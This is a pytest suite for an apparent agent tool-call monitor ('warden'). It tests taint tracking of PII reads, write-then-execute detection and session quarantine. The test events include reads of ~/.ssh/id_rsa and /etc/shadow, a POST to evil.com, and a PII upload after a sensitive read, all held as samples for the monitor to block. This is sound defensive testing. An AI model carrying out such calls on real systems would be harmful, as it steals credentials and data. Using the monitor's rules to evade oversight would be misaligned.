"""Session layer semantics: taint timing (D5), arming (D11), quarantine (D7/D10)."""

from pathlib import Path
from typing import Any

from warden.engine import Engine
from warden.policy import Policy, load_policy
from warden.runner import StreamProcessor
from warden.schema import Decision, ToolCallEvent
from warden.session import SessionState, evaluate, update
from warden.store import MemoryStore

POLICY = load_policy(Path(__file__).parent.parent / "policy.yaml")


def ev(tool: str, call_id: str = "c-1", session: str = "s-1", **args: Any) -> ToolCallEvent:
    return ToolCallEvent(id=call_id, session_id=session, tool=tool, args=args)


def run_events(policy: Policy, events: list[ToolCallEvent]) -> list[Decision]:
    """Drive events through the full pipeline with fresh in-memory state."""
    engine = Engine(policy)
    states: dict[str, SessionState] = {}
    decisions = []
    for event in events:
        state = states.setdefault(event.session_id, SessionState(session_id=event.session_id))
        decision = engine.decide(event, evaluate(policy, state, event))
        update(policy, state, decision, event)
        decisions.append(decision)
    return decisions


# --- taint timing (D5) --------------------------------------------------------


def test_allowed_pii_read_taints_then_post_blocked_with_provenance() -> None:
    decisions = run_events(
        POLICY,
        [
            ev("fs.read", "c-1", path="./data/pii/customers.csv"),
            ev("http.post", "c-2", url="https://api.example.com/upload"),
        ],
    )
    assert decisions[0].decision == "allow"
    assert (decisions[1].decision, decisions[1].rule) == ("block", "taint.exfil-post")
    assert "c-1" in decisions[1].reason  # provenance names the tainting call
    assert "static.http-known-apis" in decisions[1].matched_rules  # static would have allowed


def test_blocked_read_never_taints() -> None:
    # ~/.ssh read is statically blocked: the data never entered the session,
    # so the following POST is judged on its own merits (allowed domain).
    decisions = run_events(
        POLICY,
        [
            ev("fs.read", "c-1", path="~/.ssh/id_rsa"),
            ev("http.post", "c-2", url="https://api.example.com/upload"),
        ],
    )
    assert decisions[0].decision == "block"
    assert decisions[1].decision == "allow"


def test_flagged_source_read_taints_pessimistically() -> None:
    # A policy where the PII read itself is flagged: review is asynchronous,
    # so the unresolved read must taint immediately (D5).
    policy = POLICY.model_copy(deep=True)
    policy.rules.insert(
        0,
        type(policy.rules[0]).model_validate(
            {
                "id": "flag-pii-reads",
                "tool": "fs.read",
                "match": {"path": ["./data/pii/**"]},
                "action": "flag",
                "reason": "PII reads need review",
            }
        ),
    )
    decisions = run_events(
        policy,
        [
            ev("fs.read", "c-1", path="./data/pii/customers.csv"),
            ev("http.post", "c-2", url="https://api.example.com/upload"),
        ],
    )
    assert decisions[0].decision == "flag"
    assert (decisions[1].decision, decisions[1].rule) == ("block", "taint.exfil-post")


def test_sink_severity_is_per_tool() -> None:  # D9
    decisions = run_events(
        POLICY,
        [
            ev("fs.read", "c-1", path="./data/pii/customers.csv"),
            ev("http.get", "c-2", url="https://api.example.com/enrich"),
            ev("shell.exec", "c-3", command="python ./workspace/analyze.py"),
            ev("http.post", "c-4", url="https://api.example.com/upload"),
        ],
    )
    assert [d.decision for d in decisions] == ["allow", "flag", "flag", "block"]
    assert decisions[1].flag_source == "rule"


# --- sequence arming (D11) ----------------------------------------------------


def test_write_then_execute_blocked_with_provenance() -> None:
    decisions = run_events(
        POLICY,
        [
            ev("fs.write", "c-1", path="./workspace/helper.py"),
            ev("shell.exec", "c-2", command="python ./workspace/helper.py"),
        ],
    )
    assert decisions[0].decision == "allow"
    assert (decisions[1].decision, decisions[1].rule) == ("block", "seq.write-then-execute")
    assert "c-1" in decisions[1].reason


def test_blocked_write_never_arms() -> None:
    # Write outside the workspace is blocked -> nothing was written -> the
    # later interpreter call is judged without the sequence rule.
    decisions = run_events(
        POLICY,
        [
            ev("fs.write", "c-1", path="/tmp/helper.py"),
            ev("shell.exec", "c-2", command="python /tmp/helper.py"),
        ],
    )
    assert decisions[0].decision == "block"
    assert "seq.write-then-execute" not in decisions[1].matched_rules


def test_path_spelling_does_not_evade_arming() -> None:
    # Written as ./workspace/x.py, executed as workspace/x.py: same file.
    decisions = run_events(
        POLICY,
        [
            ev("fs.write", "c-1", path="./workspace/x.py"),
            ev("shell.exec", "c-2", command="python workspace/x.py"),
        ],
    )
    assert decisions[1].rule == "seq.write-then-execute"


def test_grep_of_written_file_is_not_execution() -> None:
    decisions = run_events(
        POLICY,
        [
            ev("fs.write", "c-1", path="./workspace/out/report.md"),
            ev("shell.exec", "c-2", command="grep total ./workspace/out/report.md"),
        ],
    )
    assert decisions[1].decision == "allow"


def test_capture_expires_outside_window() -> None:
    window = next(s.when.within_calls for s in POLICY.sequences if s.id == "write-then-execute")
    filler = [
        ev("fs.read", f"f-{i}", path="./workspace/notes.txt") for i in range(window)
    ]
    events = [ev("fs.write", "c-1", path="./workspace/helper.py"), *filler,
              ev("shell.exec", "c-2", command="python ./workspace/helper.py")]
    decisions = run_events(POLICY, events)
    assert "seq.write-then-execute" not in decisions[-1].matched_rules


# --- quarantine (D7, D10) -----------------------------------------------------


def _probe_events() -> list[ToolCallEvent]:
    return [
        ev("http.post", "b-1", url="https://evil.com/x"),
        ev("fs.read", "b-2", path="/etc/shadow"),
        ev("fs.delete", "b-3", path="./workspace/tmp.txt"),
    ]


def test_three_blocks_quarantine_the_session() -> None:
    decisions = run_events(
        POLICY, [*_probe_events(), ev("fs.read", "b-4", path="./workspace/notes.txt")]
    )
    assert [d.decision for d in decisions[:3]] == ["block", "block", "block"]
    last = decisions[3]
    assert (last.decision, last.rule) == ("flag", "session.quarantine")
    assert last.flag_source == "quarantine"
    assert "seq.probing" in last.reason


def test_quarantine_is_sticky_beyond_the_window() -> None:
    # 20 benign calls after the trigger: the 10-call window has long slid
    # past, but quarantine has no decay (D7).
    benign = [ev("fs.read", f"a-{i}", path="./workspace/notes.txt") for i in range(20)]
    decisions = run_events(POLICY, [*_probe_events(), *benign])
    assert all(d.decision == "flag" for d in decisions[3:])
    assert decisions[-1].flag_source == "quarantine"


def test_rule_flag_in_quarantined_session_keeps_rule_source() -> None:  # D10 dual-source
    decisions = run_events(
        POLICY, [*_probe_events(), ev("shell.exec", "b-4", command="git push")]
    )
    last = decisions[3]
    assert last.decision == "flag"
    assert last.flag_source == "rule"  # its own merits, not just the downgrade
    assert last.rule == "static.shell-anything-else"  # rule reason leads
    assert "session.quarantine" in last.matched_rules  # downgrade still visible


def test_block_still_blocks_under_quarantine() -> None:
    decisions = run_events(
        POLICY, [*_probe_events(), ev("fs.read", "b-4", path="~/.ssh/id_rsa")]
    )
    assert decisions[3].decision == "block"
    assert decisions[3].flag_source is None


# --- malformed attribution (DESIGN.md 6b collision test) -----------------------


def test_attributable_garbage_quarantines_but_unparseable_does_not() -> None:
    policy = POLICY
    processor = StreamProcessor(policy, MemoryStore())
    lines = [
        '{"id": "m-1", "session_id": "s-mal", "args": {}}',  # no tool
        '{"id": "m-2", "session_id": "s-mal", "tool": 123, "args": {}}',
        '{"id": "m-3", "session_id": "s-mal", "tool": "fs.read"}',  # no args
        '{"id": "m-4", "session_id": "s-mal", "tool": "fs.read",'
        ' "args": {"path": "./workspace/a.txt"}}',
    ]
    decisions = [processor.process_line(line, i + 1) for i, line in enumerate(lines)]
    assert [d.decision for d in decisions if d] == ["block", "block", "block", "flag"]
    assert decisions[3] is not None and decisions[3].flag_source == "quarantine"

    fresh = StreamProcessor(policy, MemoryStore())
    garbage = ["not json at all", "{broken", "[1,2]"]
    for i, line in enumerate(garbage):
        d = fresh.process_line(line, i + 1)
        assert d is not None and d.session_id is None
    ok = fresh.process_line(lines[3], 4)
    assert ok is not None and ok.decision == "allow"  # nothing attributable: no quarantine
